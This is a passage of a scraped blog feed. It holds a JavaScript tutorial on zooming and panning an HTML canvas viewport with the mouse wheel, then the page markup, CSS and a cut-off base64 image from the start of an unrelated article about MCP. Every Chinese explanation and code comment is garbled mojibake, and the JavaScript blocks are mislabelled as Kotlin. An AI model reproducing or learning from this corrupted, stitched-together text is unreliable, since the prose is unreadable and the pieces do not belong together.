<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// src/view/viewport.js</span>
<span class="hljs-keyword">import</span> Point2D from <span class="hljs-string">"../primitives/point2D.js"</span>;

export default <span class="hljs-keyword">class</span> <span class="hljs-title class_">Viewport</span> {
  <span class="hljs-keyword">constructor</span>(canvas) {
    <span class="hljs-keyword">this</span>.canvas = canvas;
    <span class="hljs-keyword">this</span>.ctx = canvas.getContext(<span class="hljs-string">"2d"</span>);

    <span class="hljs-keyword">this</span>.zoom = <span class="hljs-number">1</span>; <span class="hljs-comment">// 1 = 100%, 2 = 200%</span>
    <span class="hljs-keyword">this</span>.center = new Point2D(canvas.width / <span class="hljs-number">2</span>, canvas.height / <span class="hljs-number">2</span>);
    <span class="hljs-comment">// offset è¡¨ç¤ºæ‘„åƒæœºçš„å¹³ç§»ä½ç½®</span>
    <span class="hljs-keyword">this</span>.offset = new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);

    <span class="hljs-keyword">this</span>.drag = {
      start: new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
      end: new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
      offset: new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
      active: <span class="hljs-literal">false</span>
    };

    <span class="hljs-keyword">this</span>.#addEventListeners();
  }

  <span class="hljs-comment">// ã€æ ¸å¿ƒæ•°å­¦å‡çº§ã€‘</span>
  <span class="hljs-comment">// å±å¹•åæ ‡ -&gt; ä¸–ç•Œåæ ‡</span>
  getMouse(evt, subtractDragOffset = <span class="hljs-literal">false</span>) {
    <span class="hljs-comment">// 1. å‡å»å±å¹•ä¸­å¿ƒï¼ˆæŠŠåŸç‚¹æŒªåˆ°å±å¹•ä¸­é—´ï¼‰</span>
    <span class="hljs-comment">// 2. é™¤ä»¥ç¼©æ”¾ï¼ˆåå‘æ˜ å°„ï¼šå±å¹•åƒç´  / ç¼©æ”¾ = ä¸–ç•Œè·ç¦»ï¼‰</span>
    <span class="hljs-comment">// 3. å‡å»æ‘„åƒæœºåç§»</span>
    <span class="hljs-keyword">const</span> p = new Point2D(
      (evt.offsetX - <span class="hljs-keyword">this</span>.center.x) / <span class="hljs-keyword">this</span>.zoom - <span class="hljs-keyword">this</span>.offset.x,
      (evt.offsetY - <span class="hljs-keyword">this</span>.center.y) / <span class="hljs-keyword">this</span>.zoom - <span class="hljs-keyword">this</span>.offset.y
    );
    <span class="hljs-keyword">return</span> p;
  }

  <span class="hljs-comment">// è·å–è®¡ç®—åçš„åç§»é‡ï¼ˆç»™ Canvas æ¸²æŸ“ç”¨ï¼‰</span>
  getOffset() {
      <span class="hljs-keyword">return</span> new Point2D(
          <span class="hljs-keyword">this</span>.offset.x + <span class="hljs-keyword">this</span>.center.x,
          <span class="hljs-keyword">this</span>.offset.y + <span class="hljs-keyword">this</span>.center.y
      );
  }

  #addEventListeners() {
    <span class="hljs-comment">// ... (ä¿ç•™ä¸Šä¸€ç¯‡çš„ç©ºæ ¼é”®ç›‘å¬ä»£ç ) ...</span>
    <span class="hljs-comment">// ... (ä¿ç•™ä¸Šä¸€ç¯‡çš„ mousedown ç›‘å¬ä»£ç ) ...</span>
    <span class="hljs-comment">// ... (ä¿ç•™ä¸Šä¸€ç¯‡çš„ mouseup ç›‘å¬ä»£ç ) ...</span>
    
    <span class="hljs-comment">// ã€æ–°å¢ã€‘é¼ æ ‡æ»šè½®ç›‘å¬</span>
    <span class="hljs-keyword">this</span>.canvas.addEventListener(<span class="hljs-string">"wheel"</span>, (evt) =&gt; <span class="hljs-keyword">this</span>.#handleWheel(evt));
    
    <span class="hljs-comment">// ... (ä¿ç•™ mousemoveï¼Œä½†è¦æ³¨æ„é‡Œé¢ getMouse çš„è°ƒç”¨) ...</span>
    <span class="hljs-comment">// ç¨å¾®ä¿®æ­£ä¸€ä¸‹ mousemove é‡Œçš„é€»è¾‘ï¼Œç¡®ä¿å®ƒæ˜¯åŸºäºæœ€æ–°çš„ zoom è®¡ç®—çš„</span>
     <span class="hljs-keyword">this</span>.canvas.addEventListener(<span class="hljs-string">"mousemove"</span>, (evt) =&gt; {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.drag.active) {
        <span class="hljs-keyword">this</span>.drag.end = <span class="hljs-keyword">this</span>.getMouse(evt);
        <span class="hljs-keyword">this</span>.drag.offset = new Point2D(
            <span class="hljs-keyword">this</span>.drag.end.x - <span class="hljs-keyword">this</span>.drag.start.x,
            <span class="hljs-keyword">this</span>.drag.end.y - <span class="hljs-keyword">this</span>.drag.start.y
        );
        <span class="hljs-comment">// ç´¯åŠ </span>
        <span class="hljs-keyword">this</span>.offset.x += <span class="hljs-keyword">this</span>.drag.offset.x;
        <span class="hljs-keyword">this</span>.offset.y += <span class="hljs-keyword">this</span>.drag.offset.y;
        
        <span class="hljs-comment">// é‡ç½® start</span>
        <span class="hljs-keyword">this</span>.drag.start = <span class="hljs-keyword">this</span>.getMouse(evt); 
      }
    });
  }

  <span class="hljs-comment">// ã€æ–°å¢ã€‘å¤„ç†æ»šè½®ç¼©æ”¾</span>
  #handleWheel(evt) {
    <span class="hljs-comment">// 1. åˆ¤æ–­æ»šè½®æ–¹å‘ (å‘ä¸Šæ»šæ˜¯è´Ÿæ•°-æ”¾å¤§ï¼Œå‘ä¸‹æ»šæ˜¯æ­£æ•°-ç¼©å°)</span>
    <span class="hljs-keyword">const</span> dir = Math.sign(evt.deltaY); 
    <span class="hljs-comment">// 2. å®šä¹‰ç¼©æ”¾æ­¥é•¿ (æ¯æ¬¡æ»šå¤§æ¦‚å˜ 10%)</span>
    <span class="hljs-keyword">const</span> step = <span class="hljs-number">0.1</span>;
    
    <span class="hljs-comment">// æ­¤å¤„åº”ç”¨â€œå®šç‚¹ç¼©æ”¾â€ç­–ç•¥ï¼š</span>
    <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šç¼©æ”¾å‰ï¼Œé¼ æ ‡åœ¨ä¸–ç•Œé‡Œçš„å“ªé‡Œï¼Ÿ</span>
    <span class="hljs-comment">// (æ³¨æ„ï¼šè¿™é‡Œç›´æ¥é€ä¼  evt è¿›å»ç®—ï¼Œä¸éœ€è¦ subtractDragOffset)</span>
    <span class="hljs-keyword">const</span> mouseBefore = <span class="hljs-keyword">this</span>.getMouse(evt);

    <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šæ‰§è¡Œç¼©æ”¾</span>
    <span class="hljs-keyword">this</span>.zoom += dir * step;
    <span class="hljs-comment">// é™åˆ¶ä¸€ä¸‹ç¼©æ”¾èŒƒå›´ï¼Œåˆ«ç¼©æ²¡äº†æˆ–è€…æ”¾å¤ªå¤§</span>
    <span class="hljs-keyword">this</span>.zoom = Math.max(<span class="hljs-number">1</span>, Math.min(<span class="hljs-number">5</span>, <span class="hljs-keyword">this</span>.zoom));

    <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šç¼©æ”¾åï¼Œé¼ æ ‡åœ¨ä¸–ç•Œé‡Œçš„å“ªé‡Œï¼Ÿ</span>
    <span class="hljs-keyword">const</span> mouseAfter = <span class="hljs-keyword">this</span>.getMouse(evt);

    <span class="hljs-comment">// ç¬¬å››æ­¥ï¼šè®¡ç®—åå·®ï¼Œä¿®æ­£ offset</span>
    <span class="hljs-comment">// æ—¢ç„¶é¼ æ ‡ä¸åº”è¯¥åŠ¨ï¼Œé‚£å¦‚æœ mouseAfter å˜äº†ï¼Œè¯´æ˜ä¸–ç•Œâ€œæ»‘â€èµ°äº†</span>
    <span class="hljs-comment">// æˆ‘ä»¬è¦æŠŠä¸–ç•Œæ‹½å›æ¥</span>
    <span class="hljs-keyword">this</span>.offset.x += (mouseAfter.x - mouseBefore.x);
    <span class="hljs-keyword">this</span>.offset.y += (mouseAfter.y - mouseBefore.y);
    
    <span class="hljs-comment">// é˜»æ­¢æµè§ˆå™¨é»˜è®¤çš„æ»šåŠ¨é¡µé¢è¡Œä¸º</span>
    evt.preventDefault();
  }
}
</code></pre>
<blockquote>
<p><strong>è¡¥å……è¯´æ˜</strong>ï¼šä½ å¯èƒ½æ³¨æ„åˆ° <code>mousemove</code> é‡Œæˆ‘æ²¡æ€ä¹ˆæ”¹ã€‚å› ä¸º <code>getMouse</code> å†…éƒ¨å·²ç»åº”ç”¨äº† <code>this.zoom</code>ã€‚åªè¦ <code>getMouse</code> å…¬å¼æ˜¯å¯¹çš„ï¼Œæ‹–æ‹½å¹³ç§»é€»è¾‘å°±èƒ½è‡ªåŠ¨é€‚é…ç¼©æ”¾ï¼ˆæ¯”å¦‚æ”¾å¤§åï¼Œæ‹–æ‹½ä¼šå˜æ…¢ï¼Œè¿™æ˜¯ç¬¦åˆç‰©ç†ç›´è§‰çš„ï¼Œå› ä¸ºä½ è§†é‡å˜å°äº†ï¼‰ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">Again And Again</h3>
<p>ç°åœ¨æ•°æ®å±‚å¯¹äº†ï¼Œä½†ç°åœ¨è¿è¡Œä»£ç ï¼Œä¼šå‘ç°ç”»é¢æ²¡æœ‰ä»»ä½•å˜åŒ–ã€‚</p>
<p>æ†‹æ€¥ï¼Œå› ä¸º Canvas è¿˜ä¸çŸ¥é“è¦ç¼©æ”¾ã€‚</p>
<p>åœ¨<code>src/index.js</code>ï¼Œéœ€è¦è°ƒæ•´ <code>ctx</code> çš„å˜æ¢é¡ºåºã€‚</p>
<p><strong>è„‘å­é‡Œè®°ç€ï¼šå…ˆå¹³ç§»åˆ°ä¸­å¿ƒï¼Œå†ç¼©æ”¾ï¼Œå†å¹³ç§»å›è§†å£åç§»ã€‚</strong></p>
<p>JavaScript</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// src/index.js</span>
<span class="hljs-comment">// ... imports</span>

export default <span class="hljs-keyword">class</span> <span class="hljs-title class_">World</span> {
  <span class="hljs-comment">// ... constructor ä¸å˜</span>

  animate() {
    <span class="hljs-keyword">this</span>.ctx.clearRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.canvas.width, <span class="hljs-keyword">this</span>.canvas.height);

    <span class="hljs-keyword">this</span>.ctx.save();
    
    <span class="hljs-comment">// 1. æŠŠåæ ‡åŸç‚¹ç§»åˆ°å±å¹•ä¸­å¿ƒ</span>
    <span class="hljs-comment">// ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Ÿå› ä¸º scale é»˜è®¤æ˜¯åŸºäº (0,0) å·¦ä¸Šè§’ç¼©æ”¾çš„ã€‚</span>
    <span class="hljs-comment">// æˆ‘ä»¬å¸Œæœ›åŸºäºå±å¹•ä¸­å¿ƒç¼©æ”¾ï¼Œè¿™æ ·æ›´ç¬¦åˆç›´è§‰ã€‚</span>
    <span class="hljs-keyword">this</span>.ctx.translate(<span class="hljs-keyword">this</span>.canvas.width / <span class="hljs-number">2</span>, <span class="hljs-keyword">this</span>.canvas.height / <span class="hljs-number">2</span>);
    
    <span class="hljs-comment">// 2. åº”ç”¨ç¼©æ”¾</span>
    <span class="hljs-keyword">this</span>.ctx.scale(<span class="hljs-keyword">this</span>.viewport.zoom, <span class="hljs-keyword">this</span>.viewport.zoom);
    
    <span class="hljs-comment">// 3. åº”ç”¨è§†å£åç§» (Viewport Offset)</span>
    <span class="hljs-comment">// è¿™é‡Œçš„ offset å·²ç»åœ¨ Viewport ç±»é‡Œå¤„ç†å¾—å¾ˆå¥½äº†</span>
    <span class="hljs-keyword">const</span> offset = <span class="hljs-keyword">this</span>.viewport.getOffset();
    <span class="hljs-comment">// è¿™é‡Œçš„ translate æ˜¯ä¸ºäº†è®© (0,0) å›åˆ°å®ƒè¯¥å»çš„åœ°æ–¹</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šå› ä¸ºä¸Šé¢å·²ç»æŠŠåŸç‚¹ç§»åˆ°äº†ä¸­å¿ƒï¼Œè¿™é‡Œè¦å‡å»ä¸­å¿ƒå—ï¼Ÿ</span>
    <span class="hljs-comment">// ä¸ï¼Œå› ä¸º Viewport.getOffset å·²ç»åŒ…å«äº† center çš„é€»è¾‘?</span>
    <span class="hljs-comment">// è®©æˆ‘ä»¬çœ‹ä¸€çœ¼ Viewport.js çš„ getOffset: return this.offset + this.center;</span>
    
    <span class="hljs-comment">// ç­‰ç­‰ï¼Œè¿™é‡Œçš„æ•°å­¦æœ‰ç‚¹ç»•ã€‚è®©æˆ‘ä»¬ç”¨æœ€ç®€å•çš„æ¨å¯¼ï¼š</span>
    <span class="hljs-comment">// æˆ‘ä»¬å¸Œæœ› point.x æœ€ç»ˆæ¸²æŸ“åœ¨ï¼š (point.x + offset.x) * zoom + center.x</span>
    <span class="hljs-comment">// Canvas çš„å˜æ¢æ ˆæ˜¯åå‘ç”Ÿæ•ˆçš„ï¼ˆæˆ–è€…è¯´çŸ©é˜µä¹˜æ³•ï¼‰ï¼š</span>
    
    <span class="hljs-comment">// ä¿®æ­£åçš„æ¸²æŸ“é€»è¾‘ï¼š</span>
    <span class="hljs-comment">// æˆ‘ä»¬åœ¨ Viewport.js çš„ getMouse é‡Œç”¨çš„å…¬å¼æ˜¯ï¼š (Screen - Center) / Zoom - Offset</span>
    <span class="hljs-comment">// é€†æ¨å› Screenï¼š Screen = (World + Offset) * Zoom + Center</span>
    
    <span class="hljs-comment">// æ‰€ä»¥ Canvas ä»£ç åº”è¯¥æ˜¯ï¼š</span>
    <span class="hljs-comment">// Translate(Center) -&gt; Scale(Zoom) -&gt; Translate(Offset)</span>
    
    <span class="hljs-comment">// è¿™é‡Œçš„ offset åªéœ€è¦ viewport.offsetï¼Œä¸éœ€è¦åŠ  center</span>
    <span class="hljs-comment">// è®©æˆ‘ä»¬å›å»å¾®è°ƒä¸€ä¸‹ Viewport.js çš„ getOffset æ–¹æ³•ï¼Œè®©å®ƒåªè¿”å›çº¯ç²¹çš„ offset</span>
    
    <span class="hljs-keyword">const</span> viewportOffset = <span class="hljs-keyword">this</span>.viewport.getOffset(); 
    <span class="hljs-keyword">this</span>.ctx.translate(<span class="hljs-keyword">this</span>.viewport.offset.x, <span class="hljs-keyword">this</span>.viewport.offset.y);

    <span class="hljs-comment">// ç”»å®ƒï¼</span>
    <span class="hljs-keyword">this</span>.editor.display();
    
    <span class="hljs-keyword">this</span>.ctx.restore();

    requestAnimationFrame(() =&gt; <span class="hljs-keyword">this</span>.animate());
  }
}
</code></pre>
<p>ä¸ºäº†é…åˆä¸Šé¢ <code>World</code> çš„æ¸…æ™°é€»è¾‘ï¼Œæˆ‘æŠŠ <code>src/view/viewport.js</code> é‡Œçš„ <code>getOffset</code> åˆ æ‰ï¼Œæˆ–è€…ç›´æ¥è®¿é—® <code>this.viewport.offset</code>ã€‚</p>
<p>ä¸ºäº†ä»£ç æ•´æ´ï¼Œåœ¨ <code>Viewport</code> é‡ŒåŠ ä¸ª getterï¼Œåªè¿”å› <code>offset</code> å±æ€§å³å¯ï¼Œä¸éœ€è¦åŠ  <code>center</code>ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¿®æ”¹ src/view/viewport.js</span>
  <span class="hljs-title function_">getOffset</span>(<span class="hljs-params"/>) {
     <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">offset</span>;
  }
</code></pre>
<hr/>
<h2 data-id="heading-6">å®Œç¾</h2>
<p>ç°åœ¨è¿è¡Œä»£ç ï¼Œä½ ä¼šå‘ç°ï¼š</p>
<ul>
<li>å¯¹ç€æŸä¸ªç‚¹æ”¾å¤§ï¼Œé‚£ä¸ªç‚¹ä¼šç¨³ç¨³åœ°åœåœ¨é¼ æ ‡æŒ‡å°–ä¸‹ï¼Œå‘¨å›´çš„ä¸–ç•Œå‘å¤–æ‰©æ•£ã€‚</li>
<li>çº¿æ¡ä¼šéšç€æ”¾å¤§å˜ç²—ï¼ˆå› ä¸º <code>ctx.lineWidth</code> ä¹Ÿè¢«æ”¾å¤§äº†ï¼‰ã€‚è¿™å…¶å®æŒºå¥½çš„ï¼Œç»†èŠ‚çœ‹å¾—æ›´æ¸…æ¥šã€‚å¦‚æœä½ ä¸å¸Œæœ›çº¿å˜ç²—ï¼Œé‚£å°±æ˜¯å¦å¤–ä¸€ä¸ªè¿›é˜¶è¯é¢˜ï¼ˆé€†ç¼©æ”¾çº¿å®½ï¼‰ã€‚</li>
</ul>
<hr/>
<p>ç°åœ¨è™šæ‹Ÿä¸–ç•Œå·²ç»åˆå…·è§„æ¨¡ï¼Œå·²ç»å®ç°ç±»çš„å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>åŸå­å±‚</strong>ï¼šç‚¹ã€çº¿ï¼ˆPoint2D/Segmentï¼‰ã€‚</li>
<li><strong>æ•°æ®å±‚</strong>ï¼šå›¾ç»“æ„ï¼ˆGraphï¼‰ã€‚</li>
<li><strong>äº¤äº’å±‚</strong>ï¼šç¼–è¾‘å™¨ï¼ˆEditorï¼‰ã€‚</li>
<li><strong>è§†è§‰å±‚</strong>ï¼šæ— é™ç”»å¸ƒ + è‡ªç”±ç¼©æ”¾ï¼ˆViewportï¼‰ã€‚</li>
</ul>
<p>å®Œå…¨å¯ä»¥æ¯«ä¸å¹æ°´çš„è¯´ï¼Œæˆ‘ä»¬å·²ç»æ„å»ºäº†ä¸€ä¸ªç±»ä¼¼äº AutoCAD æˆ– Google Maps çš„åŸºç¡€å¼•æ“ã€‚</p>
<p>å˜å˜~</p>
<p>å¦ï¼Œè¿™ä¸ªä¸“æ æ‰“ç®—æ”¾ä¸€æ”¾äº†ï¼Œå¥½åƒæ²¡å•¥äººå…³æ³¨ï¼Œå®åœ¨æ²¡å•¥åŠ¨åŠ›äº†~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCP å®Œå…¨æŒ‡å—ï¼ˆä¸Šï¼‰ï¼šæ’•æ‰æ ‡ç­¾ï¼Œçœ‹æ¸…æœ¬è´¨]]></title>    <link>https://juejin.cn/post/7581888578507522075</link>    <guid>https://juejin.cn/post/7581888578507522075</guid>    <pubDate>2025-12-10T01:48:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507522075" data-draft-id="7580623265791901734" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCP å®Œå…¨æŒ‡å—ï¼ˆä¸Šï¼‰ï¼šæ’•æ‰æ ‡ç­¾ï¼Œçœ‹æ¸…æœ¬è´¨"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-10T01:48:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€æ—…äºº"/> <meta itemprop="url" content="https://juejin.cn/user/3485898277388519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCP å®Œå…¨æŒ‡å—ï¼ˆä¸Šï¼‰ï¼šæ’•æ‰æ ‡ç­¾ï¼Œçœ‹æ¸…æœ¬è´¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485898277388519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€æ—…äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:48:03.000Z" title="Wed Dec 10 2025 01:48:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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